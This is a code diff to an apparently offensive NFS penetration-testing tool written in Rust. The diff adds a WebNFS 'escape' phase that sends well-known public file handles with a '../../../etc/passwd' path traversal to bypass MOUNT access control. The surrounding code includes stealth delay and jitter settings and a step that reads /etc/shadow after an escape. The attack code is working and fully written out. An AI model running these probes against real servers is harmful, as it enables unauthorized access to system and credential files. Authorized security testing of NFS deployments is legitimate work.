@@ -86,6 +86,18 @@ pub(crate) enum EscapeOutcome {
         /// How the handle was found (e.g. "verified", "found via scan").
         note: String,
     },
+    /// WebNFS public handle accepted -- MOUNT bypass confirmed via
+    /// multi-component LOOKUP path traversal (RFC 2054 sec. 5, 6;
+    /// C702 Appendix E).  The server processes slash-delimited paths in a
+    /// single LOOKUP against the well-known public handle, bypassing the
+    /// MOUNT protocol entirely.
+    WebNfs {
+        /// The public handle the server accepted (zero-length for v3,
+        /// all-zero 32 bytes for v2).
+        public_handle: FileHandle,
+        /// NFS version that accepted the public handle.
+        version: &'static str,
+    },
     /// Handle format is valid (STALE hits) but the root inode was not found
     /// within `2..=max_root_scan` -- a higher `--max-root-scan` may help.
     StaleNoRoot,
@@ -106,6 +118,7 @@ pub(crate) async fn run(args: EscapeArgs, globals: &GlobalOpts) -> anyhow::Resul
 }
 
 /// Strategy (fully automatic, no flags needed):
+///   0. Probe WebNFS public handles (cheapest -- one LOOKUP, no MOUNT needed).
 ///   1. Mount the export and detect the filesystem type from the handle format.
 ///   2. Probe known root inodes for the detected type.
 ///   3. If all known candidates return STALE, fall back to scanning
@@ -116,6 +129,16 @@ pub(crate) async fn run(args: EscapeArgs, globals: &GlobalOpts) -> anyhow::Resul
 /// credential is rejected.
 async fn run_inner(host: &str, export: &str, btrfs_subvols: u32, max_root_scan: u32, globals: &GlobalOpts) -> anyhow::Result<()> {
     eprintln!("{}", crate::output::status_info(&format!("Escaping export {host}:{export}")));
+
+    // Phase 0: WebNFS public handle probe -- cheapest path, no MOUNT needed.
+    // One LOOKUP per NFS version with a well-known constant handle (RFC 2054
+    // sec. 5, 6). Falls through silently when the server does not support WebNFS.
+    if let Some(outcome) = try_webnfs_escape(host, globals).await {
+        if let EscapeOutcome::WebNfs { ref public_handle, version } = outcome {
+            print_webnfs_success(public_handle, version, host);
+        }
+        return Ok(());
+    }
 
     // Try NFSv3 first; fall back to NFSv2 if MOUNT v3 fails.
     let result = find_escape(host, export, btrfs_subvols, max_root_scan, globals, true).await;
@@ -136,6 +159,9 @@ async fn run_inner(host: &str, export: &str, btrfs_subvols: u32, max_root_scan: 
                 EscapeOutcome::Success { candidate, note } => {
                     print_escape_success(&candidate, &note, host);
                 },
+                EscapeOutcome::WebNfs { public_handle, version } => {
+                    print_webnfs_success(&public_handle, version, host);
+                },
                 EscapeOutcome::StaleNoRoot => {
                     eprintln!("{}", crate::output::status_err(&format!("NFSv2: handle format valid (STALE) but root not found in inodes 2..={max_root_scan}.")));
                 },
@@ -152,6 +178,9 @@ async fn run_inner(host: &str, export: &str, btrfs_subvols: u32, max_root_scan: 
             print_escape_success(&candidate, &note, host);
             try_read_shadow_post_escape(&probe_client, &candidate.root_handle).await;
         },
+        EscapeOutcome::WebNfs { public_handle, version } => {
+            print_webnfs_success(&public_handle, version, host);
+        },
         EscapeOutcome::StaleNoRoot => {
             eprintln!("{}", crate::output::status_err(&format!("Handle format is valid (STALE hits) but root not found in inodes 2..={max_root_scan}. Try --max-root-scan with a higher value.")));
         },
@@ -166,10 +195,67 @@ async fn run_inner(host: &str, export: &str, btrfs_subvols: u32, max_root_scan: 
 /// (no client). Used by `scan --auto-escape` which doesn't need the client
 /// for post-escape reads.
 pub(crate) async fn find_escape_any(host: &str, export: &str, btrfs_subvols: u32, max_root_scan: u32, globals: &GlobalOpts, announce: bool) -> anyhow::Result<EscapeOutcome> {
+    // Phase 0: WebNFS public handle probe -- one LOOKUP, no MOUNT needed.
+    if let Some(outcome) = try_webnfs_escape(host, globals).await {
+        return Ok(outcome);
+    }
     match find_escape(host, export, btrfs_subvols, max_root_scan, globals, announce).await {
         Ok((_client, outcome)) => Ok(outcome),
         Err(_) => find_escape_v2(host, export, max_root_scan, globals).await,
     }
+}
+
+/// Try WebNFS public handle escape (RFC 2054 sec. 5, 6; C702 Appendix E).
+///
+/// WebNFS defines well-known "public" file handles that bypass MOUNT:
+/// - NFSv3: zero-length opaque (empty `nfs_fh3`)
+/// - NFSv2: all-zero 32 bytes (`[0u8; 32]`)
+///
+/// A multi-component LOOKUP sends an entire slash-delimited path in one LOOKUP
+/// call against the public handle.  A WebNFS server splits the name at `/`
+/// boundaries; a non-WebNFS server rejects the filename (contains `/`) and we
+/// fall through.  One LOOKUP call per version -- cheap and non-destructive.
+async fn try_webnfs_escape(host: &str, globals: &GlobalOpts) -> Option<EscapeOutcome> {
+    let addr = parse_addr_with_port(host, globals.nfs_port).ok()?;
+    let stealth = StealthConfig::new(globals.delay, globals.jitter);
+
+    // Multi-component LOOKUP: slashes in a single LOOKUP name are what makes
+    // this "multi-component" -- the WebNFS server splits them (C702 App. E).
+    let traversal = "../../../etc/passwd";
+
+    // NFSv3: zero-length FileHandle is the WebNFS public handle (RFC 2054 sec. 6).
+    let (_, _, v3_client) = make_client_with_hostname(addr, "/", 0, 0, &[], stealth.clone(), globals.proxy.as_deref(), globals.nfs_port, &globals.hostname);
+    let public_v3 = FileHandle::from_bytes(&[]);
+    if v3_client.resolve(&public_v3, traversal).await.is_ok() {
+        tracing::info!("WebNFS public handle accepted on NFSv3 -- MOUNT bypass confirmed");
+        return Some(EscapeOutcome::WebNfs { public_handle: public_v3, version: "v3" });
+    }
+
+    // NFSv2: all-zero 32-byte handle is the WebNFS public handle (RFC 2054 sec. 5).
+    let (_, _, v2_client) = make_v2_client_with_hostname(addr, "/", 0, 0, &[], stealth, globals.proxy.as_deref(), globals.nfs_port, &globals.hostname);
+    let public_v2 = nfswolf_nfs2::Nfs2FileHandle([0u8; 32]);
+    if v2_client.lookup(&public_v2, traversal).await.is_ok() {
+        tracing::info!("WebNFS public handle accepted on NFSv2 -- MOUNT bypass confirmed");
+        return Some(EscapeOutcome::WebNfs { public_handle: FileHandle::from_bytes(&public_v2.0), version: "v2" });
+    }
+
+    None
+}
+
+/// Print a WebNFS escape success report.
+fn print_webnfs_success(public_handle: &FileHandle, version: &str, host: &str) {
+    let hex = public_handle.to_hex();
+    println!();
+    println!("  {}  WebNFS public handle accepted -- MOUNT bypass (NFS{version})", "[+]".bold().green());
+    println!("  {}  Multi-component LOOKUP path traversal confirmed (RFC 2054; C702 App. E)", "    ".dimmed());
+    if hex.is_empty() {
+        // NFSv3 zero-length handle: print a hint rather than an empty string.
+        crate::output::print_handle("Public handle", "(zero-length -- pass empty string to --handle)");
+    } else {
+        crate::output::print_handle("Public handle", &hex);
+    }
+    crate::output::print_handle_next_steps(&hex, host);
+    println!();
 }
 
 /// NFSv3 export-escape primitive.
